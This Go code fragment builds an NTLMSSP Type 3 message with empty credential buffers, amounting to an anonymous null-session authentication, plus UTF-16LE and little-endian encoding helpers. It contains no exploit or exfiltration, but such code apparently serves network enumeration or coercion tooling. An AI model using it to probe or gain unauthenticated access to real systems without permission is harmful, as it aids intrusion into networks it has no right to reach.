// All security buffer offsets point to byte 88 (right past the fixed header).
func buildNTLMSSPAuth() []byte {
	const fixedLen = 88
	msg := make([]byte, fixedLen)
	copy(msg[0:8], []byte("NTLMSSP\x00"))
	binary.LittleEndian.PutUint32(msg[8:12], 3) // Type 3

	// Each security buffer: Len(2) + MaxLen(2) + Offset(4) — all lengths 0,
	// all offsets point to fixedLen.
	offsets := []int{12, 20, 28, 36, 44, 52} // LmResp, NtResp, Domain, User, Workstation, EncRandSessKey
	for _, off := range offsets {
		binary.LittleEndian.PutUint16(msg[off:off+2], 0)              // Len
		binary.LittleEndian.PutUint16(msg[off+2:off+4], 0)            // MaxLen
		binary.LittleEndian.PutUint32(msg[off+4:off+8], fixedLen)     // Offset
	}

	// NegotiateFlags: NEGOTIATE_UNICODE | NEGOTIATE_NTLM + misc
	binary.LittleEndian.PutUint32(msg[60:64], 0x00088203)

	return msg
}

// --- String helpers ---

func coerceUTF16LE(s string) []byte {
	runes := []rune(s)
	out := make([]byte, 0, len(runes)*2+2)
	for _, r := range runes {
		if r <= 0xFFFF {
			out = append(out, byte(r), byte(r>>8))
		}
	}
	return out
}

func appendLE32(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}
